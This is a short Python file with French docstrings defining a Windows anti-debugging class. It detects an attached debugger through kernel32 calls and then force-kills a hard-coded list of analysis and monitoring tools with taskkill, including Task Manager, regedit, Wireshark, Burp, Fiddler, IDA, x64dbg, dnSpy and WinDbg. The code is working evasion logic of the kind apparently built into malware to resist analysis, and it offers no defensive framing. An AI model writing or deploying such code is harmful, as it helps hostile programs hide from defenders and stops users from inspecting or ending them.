import ctypes
import subprocess
import sys

class AntiDbg:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32

    def is_debugger_present(self):
        """
        Vérifie si un débogueur est attaché au processus courant.
        Renvoie True si un débogueur est détecté, sinon False.
        """
        return self.kernel32.IsDebuggerPresent() != 0

    def check_debugger_heap(self):
        """
        Vérifie l'indicateur de présence de débogueur dans le segment de heap.
        """
        is_debugging = ctypes.c_bool(False)
        self.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), ctypes.byref(is_debugging))
        return is_debugging.value

    def kill_bad_processes(self):
        """
        Supprime les processus suspects associés à des outils de débogage.
        """
        processes_to_kill = [
            "taskmgr.exe", "process.exe", "processhacker.exe", "ksdumper.exe", "fiddler.exe",
            "httpdebuggerui.exe", "wireshark.exe", "httpanalyzerv7.exe", "fiddler.exe", "decoder.exe",
            "regedit.exe", "procexp.exe", "dnspy.exe", "vboxservice.exe", "burpsuit.exe",
            "DbgX.Shell.exe", "ILSpy.exe", "ollydbg.exe", "x32dbg.exe", "x64dbg.exe", "gdb.exe",
            "idaq.exe", "idag.exe", "idaw.exe", "ida64.exe", "idag64.exe", "idaw64.exe",
            "idaq64.exe", "windbg.exe", "ollydbg.exe", "immunitydebugger.exe", "windasm.exe"
        ]

        for process in processes_to_kill:
            try:
                subprocess.run(["taskkill", "/F", "/IM", process], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except Exception as e:
                pass

    def check_process(self):
        """
        Vérifie si un débogueur est présent. Si détecté, effectue les actions appropriées.
        """
        if self.is_debugger_present():
            return True 

        if self.check_debugger_heap():
            return True  
        
        return False  

    def ant_dbg(self):
        """
        Méthode principale pour exécuter la logique anti-debug.
        Retourne True si un débogueur est détecté, sinon False.
        """
        if self.check_process():
            self.kill_bad_processes() 
            return True  

        return False 